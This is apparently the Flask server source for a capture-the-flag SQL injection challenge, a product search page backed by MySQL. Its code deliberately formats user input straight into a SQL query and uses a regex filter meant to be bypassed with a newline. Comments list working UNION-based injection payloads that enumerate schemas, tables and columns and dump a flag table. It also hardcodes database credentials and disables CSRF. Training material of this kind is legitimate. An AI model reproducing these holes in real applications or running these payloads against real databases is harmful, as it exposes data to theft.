import sys

from flask import Flask, render_template, redirect, url_for
from flask_bootstrap import Bootstrap
from flask_wtf import FlaskForm
from wtforms import StringField, SubmitField
import MySQLdb
from urllib.parse import quote_plus
import random
import re
import os

app = Flask(__name__)
app.jinja_env.filters['quote_plus'] = lambda u: quote_plus(u)

app.config['SECRET_KEY'] = 'EWuuMqhcZU2j85BQ'

bootstrap = Bootstrap(app)

# TODO make connection more robust so it reconnects on disconnect?
# TODO test app extensively with automated scanners like sqlmap?
# TODO test how robust app is installed as service
# TODO run service as restricted user?
# TODO log sth of waitress service to file?

db = MySQLdb.connect(host=os.environ["MYSQL_HOST"], port= 3306, user="flask", passwd="v5UmnxifRv", db="flask")
#db = MySQLdb.connect(host="172.22.180.13", port= 3000, user="flask", passwd="v5UmnxifRv", db="flask")


class DBQueryForm(FlaskForm):
    # deactivate csrf
    class Meta:
        csrf = False
    query = StringField('Search for our available yummy products :)')
    submit = SubmitField('Submit')
    


def query_db(query: str) -> list:
    #
    #       HOW TO GET THE FLAG, ONE POSSIBILITY AS FOLLOWS:
    #
    # possible injection to display all products:
    #            %' or 'a'='a'; #
    # how to get database names:
    #            %' or 'a'='a' union select group_concat(schema_name) from information_schema.schemata; #
    # how to get table names:
    #            %' or 'a'='a' union select group_concat(table_name) from information_schema.tables where table_schema='flask'; #
    # get column names of table 'flag':
    #            %' or 'a'='a' union select group_concat(column_name) from information_schema.columns where table_name='flag'; #
    # get flag itself
    #            %' or 'a'='a' union select group_concat(flag) from flask.flag; #
    query = "SELECT imagefile FROM products where lower(productname) like '%{}%'".format(query)
    cursor = db.cursor()
    try:
        cursor.execute(query)
        result = cursor.fetchall()
        result_list = list()
        for element in result:
            result_list.append(element[0])
    except Exception:
        result_list = ["Stop it script kiddy"]
        print(sys.exc_info())
    # always close cursor, no matter if an exception occurred or not
    finally:
        cursor.close()

    return result_list

@app.route('/surprise/<random_number>')
def surprise(random_number: int):
    # important: change accordingly depending on the number of pages we have!
    return redirect(url_for('static', filename='{}.html'.format(random_number)), code=301)

@app.route('/display/<filename>')
def display_image(filename: str):
    return redirect(url_for('static', filename='uploads/' + filename), code=301)

@app.route('/', methods=['GET', 'POST'])
def index():
    result_list = None
    call_surprise = False
    random_number = 1
    form = DBQueryForm()
    # only do sth when there is a filename given!
    if form.validate_on_submit():
        # we have to use encoding and decoding to unescape any \\n -> \n
        # otherwise the exploit will not work
        # https://stackoverflow.com/questions/1885181/how-to-un-escape-a-backslash-escaped-string
        string_input = form.query.data
        # do unescaping
        string_input = string_input.encode('utf-8').decode('unicode_escape')
        if string_input != "":
            # we use this: to make it a little bit harder:
            # https://www.secjuice.com/python-re-match-bypass-technique/
            if re.match(r'.*(["\';=%]|select|union|from|where).*', string_input, re.IGNORECASE):
                call_surprise = True
                random_number = random.randint(1,10)
            else:
                result_list = query_db(string_input)
    return render_template('index.html', form=form, result_list=result_list, call_surprise=call_surprise, random_number=random_number)



# if we want to make the challenge a little bit more easy, we can display a custom error message for the image not found:
#@app.errorhandler(404)
#def page_not_found(e):
#    # note that we set the 404 status explicitly
#    return render_template('404.html'), 404

if __name__ == "__main__":
    app.run()


# windows: set FLASK_APP=server.py
# linux: export FLASK_APP=server.py
# flask run -p 8080
# only available on unix: gunicorn --bind 127.0.0.1:8080 server:app
# curl -X POST -d "tablename=flag&submit=Submit" http://localhost:8080